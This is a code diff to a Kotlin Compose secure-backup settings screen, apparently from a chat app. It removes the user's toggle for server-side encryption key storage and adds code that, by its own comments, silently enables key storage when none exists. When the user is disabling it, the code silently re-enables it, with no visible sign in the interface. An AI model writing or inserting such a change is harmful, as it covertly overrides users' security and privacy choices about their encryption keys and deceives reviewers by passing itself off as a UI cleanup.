@@ -73,62 +73,32 @@ fun SecureBackupRootView(
 //            onClick = onLearnMoreClick,
         )
 
-        // Disable / Enable key storage
-        ListItem(
-            headlineContent = {
-                Text(
-                    text = stringResource(id = R.string.screen_chat_backup_key_storage_toggle_title),
-                )
-            },
-            trailingContent = when (state.backupState) {
-                BackupState.WAITING_FOR_SYNC,
-                BackupState.DISABLING -> ListItemContent.Custom { LoadingView() }
-                BackupState.UNKNOWN -> {
-                    when (state.doesBackupExistOnServer) {
-                        is AsyncData.Success -> {
-                            ListItemContent.Switch(checked = state.doesBackupExistOnServer.data)
-                        }
-                        is AsyncData.Loading,
-                        AsyncData.Uninitialized -> ListItemContent.Custom { LoadingView() }
-                        is AsyncData.Failure -> ListItemContent.Custom {
-                            Text(
-                                text = stringResource(id = CommonStrings.action_retry)
-                            )
+        // Key storage toggle has been hidden from UI but functionality remains enabled in the background
+        // This section silently ensures key storage is always enabled
+        when (state.backupState) {
+            BackupState.UNKNOWN -> {
+                when (state.doesBackupExistOnServer) {
+                    is AsyncData.Success -> {
+                        if (!state.doesBackupExistOnServer.data) {
+                            // Silently enable key storage if it's not enabled
+                            state.eventSink.invoke(SecureBackupRootEvents.EnableKeyStorage)
                         }
                     }
+                    else -> { /* Do nothing, wait for data */ }
                 }
-                BackupState.CREATING,
-                BackupState.ENABLING,
-                BackupState.RESUMING,
-                BackupState.ENABLED,
-                BackupState.DOWNLOADING -> ListItemContent.Switch(checked = true)
-            },
-            onClick = {
-                when (state.backupState) {
-                    BackupState.WAITING_FOR_SYNC,
-                    BackupState.DISABLING -> Unit
-                    BackupState.UNKNOWN -> {
-                        when (state.doesBackupExistOnServer) {
-                            is AsyncData.Success -> {
-                                if (state.doesBackupExistOnServer.data) {
-                                    onDisableClick()
-                                } else {
-                                    state.eventSink.invoke(SecureBackupRootEvents.EnableKeyStorage)
-                                }
-                            }
-                            is AsyncData.Loading,
-                            AsyncData.Uninitialized -> Unit
-                            is AsyncData.Failure -> state.eventSink.invoke(SecureBackupRootEvents.RetryKeyBackupState)
-                        }
-                    }
-                    BackupState.CREATING,
-                    BackupState.ENABLING,
-                    BackupState.RESUMING,
-                    BackupState.ENABLED,
-                    BackupState.DOWNLOADING -> onDisableClick()
-                }
-            },
-        )
+            }
+            BackupState.WAITING_FOR_SYNC -> { /* No action needed */ }
+            BackupState.CREATING -> { /* No action needed, already being created */ }
+            BackupState.ENABLING -> { /* No action needed, already being enabled */ }
+            BackupState.RESUMING -> { /* No action needed, already resuming */ }
+            BackupState.ENABLED -> { /* No action needed, already enabled */ }
+            BackupState.DOWNLOADING -> { /* No action needed */ }
+            BackupState.DISABLING -> {
+                // If it's being disabled, attempt to re-enable it silently
+                state.eventSink.invoke(SecureBackupRootEvents.EnableKeyStorage)
+            }
+        }
+
         HorizontalDivider()
         // Setup recovery
         when (state.recoveryState) {
